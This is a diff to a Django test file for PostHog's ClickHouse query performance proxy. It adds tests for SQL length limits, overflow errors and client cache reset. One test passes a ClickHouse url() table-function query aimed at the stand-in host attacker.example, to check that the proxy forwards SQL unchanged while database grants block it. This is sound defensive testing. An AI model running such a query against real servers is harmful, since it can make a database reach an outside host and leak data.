@@ -3,8 +3,12 @@ from datetime import timedelta
 from posthog.test.base import APIBaseTest
 from unittest.mock import MagicMock, patch
 
+from django.conf import settings as django_settings
 from django.test import override_settings
 from django.utils import timezone
+
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import rsa
 
 from posthog.api.query_performance_proxy import _reset_sync_client_cache
 from posthog.errors import InternalCHQueryError
@@ -13,7 +17,20 @@ from posthog.models.oauth import OAuthAccessToken, OAuthApplication
 TEST_HOST = "clickhouse-test.internal"
 
 
-@override_settings(CLICKHOUSE_TEST_CLUSTER_HOST=TEST_HOST, DEBUG=True)
+def _generate_rsa_key() -> str:
+    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+    return key.private_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PrivateFormat.TraditionalOpenSSL,
+        encryption_algorithm=serialization.NoEncryption(),
+    ).decode("utf-8")
+
+
+@override_settings(
+    CLICKHOUSE_TEST_CLUSTER_HOST=TEST_HOST,
+    DEBUG=True,
+    OAUTH2_PROVIDER={**django_settings.OAUTH2_PROVIDER, "OIDC_RSA_PRIVATE_KEY": _generate_rsa_key()},
+)
 class TestQueryPerformanceProxyViewSet(APIBaseTest):
     def setUp(self):
         super().setUp()
@@ -124,7 +141,6 @@ class TestQueryPerformanceProxyViewSet(APIBaseTest):
         assert passed_settings["max_result_rows"] == 10_000
         assert passed_settings["max_result_bytes"] == 10 * 1024 * 1024
         assert passed_settings["result_overflow_mode"] == "throw"
-        assert mocked.call_args.kwargs.get("readonly") is True
         client = mocked.call_args.kwargs["sync_client"]
         assert client.connection.hosts[0][0] == TEST_HOST
 
@@ -229,6 +245,89 @@ class TestQueryPerformanceProxyViewSet(APIBaseTest):
         assert payload["elapsed_ms"] == 123.4
         assert payload["query_id"] == "qid-abc-123"
 
+    # --- SQL validation ----------------------------------------------------
+
+    def test_rejects_sql_over_length_cap(self):
+        # The length cap is a Python-memory bound on the proxy, not a security
+        # control. Over-cap SQL is rejected at the serializer before it ever
+        # reaches `sync_execute`.
+        from posthog.api.query_performance_proxy import MAX_SQL_LENGTH
+
+        token = self._make_token(["clickhouse_test_cluster_perf:test_read"])
+        with patch("posthog.api.query_performance_proxy.sync_execute") as mocked:
+            resp = self._post(
+                "/api/query_performance_proxy/execute-test/",
+                token=token,
+                body={"sql": "SELECT 1 -- " + ("x" * MAX_SQL_LENGTH)},
+            )
+        assert resp.status_code == 400
+        assert mocked.call_count == 0
+
+    def test_forwards_sql_verbatim_without_django_layer_validation(self):
+        # SQL safety is enforced by the CH user's grants (no table-function
+        # grants, SELECT only on the allowlisted tables) — not by parsing SQL
+        # in the Django layer. Regex-based SQL filtering is not safe.
+        # Confirm the proxy forwards verbatim so CH sees (and rejects) exactly
+        # what the caller sent.
+        token = self._make_token(["clickhouse_test_cluster_perf:test_read"])
+        sql = "SELECT * FROM url('http://attacker.example/', CSV, 'x String')"
+        with patch("posthog.api.query_performance_proxy.sync_execute") as mocked:
+            mocked.return_value = []
+            resp = self._post(
+                "/api/query_performance_proxy/execute-test/",
+                token=token,
+                body={"sql": sql},
+            )
+        assert resp.status_code == 200, resp.content
+        assert mocked.call_args.args[0] == sql
+
+    # --- overflow behaviour ------------------------------------------------
+
+    def test_result_overflow_throws_rather_than_truncates(self):
+        # `result_overflow_mode='throw'` + `max_result_rows` is what prevents
+        # the compare oracle from silently crowning a wrong candidate whose
+        # result was just truncated to match a truncated baseline. Assert the
+        # overflow path becomes a 502 with the CH code, not a 200 with a
+        # truncated result.
+        token = self._make_token(["clickhouse_test_cluster_perf:test_read"])
+        # CH error 396: TOO_MANY_ROWS_OR_BYTES
+        with patch(
+            "posthog.api.query_performance_proxy.sync_execute",
+            side_effect=InternalCHQueryError("result set is too large", code=396),
+        ):
+            resp = self._post(
+                "/api/query_performance_proxy/execute-test/",
+                token=token,
+                body={"sql": "SELECT number FROM system.numbers LIMIT 1000000"},
+            )
+        assert resp.status_code == 502
+        assert resp.json() == {"error": "clickhouse query failed", "code": 396}
+
+    # --- client lifecycle --------------------------------------------------
+
+    def test_connection_failure_invalidates_client_cache(self):
+        # A transient CH outage leaves a zombie client in the cache; every
+        # subsequent request would 502 until process restart without the
+        # reset. Assert the next call builds a fresh client instead.
+        import posthog.api.query_performance_proxy as module
+
+        token = self._make_token(["clickhouse_test_cluster_perf:test_read"])
+        fake_client = MagicMock()
+        module._SYNC_CLIENT = fake_client
+        module._SYNC_CLIENT_KEY = (TEST_HOST, "", "", "", False, None, True)
+
+        with patch(
+            "posthog.api.query_performance_proxy.sync_execute",
+            side_effect=ConnectionError("broken pipe"),
+        ):
+            resp = self._post(
+                "/api/query_performance_proxy/execute-test/",
+                token=token,
+                body={"sql": "SELECT 1"},
+            )
+        assert resp.status_code == 502
+        assert module._SYNC_CLIENT is None
+
     # --- token scoping -----------------------------------------------------
 
     def test_scoped_teams_token_for_another_team_can_still_reach_endpoint(self):
@@ -236,7 +335,9 @@ class TestQueryPerformanceProxyViewSet(APIBaseTest):
         # team to validate against — a token scoped to a different team must
         # still be accepted. Guards against a regression where the proxy
         # started rejecting scoped_teams tokens entirely.
-        other_team_token = self._make_token(["clickhouse_test_cluster_perf:test_read"], scoped_teams=[self.team.id + 999])
+        other_team_token = self._make_token(
+            ["clickhouse_test_cluster_perf:test_read"], scoped_teams=[self.team.id + 999]
+        )
 
         with patch("posthog.api.query_performance_proxy.sync_execute") as mocked:
             mocked.return_value = [(1,)]
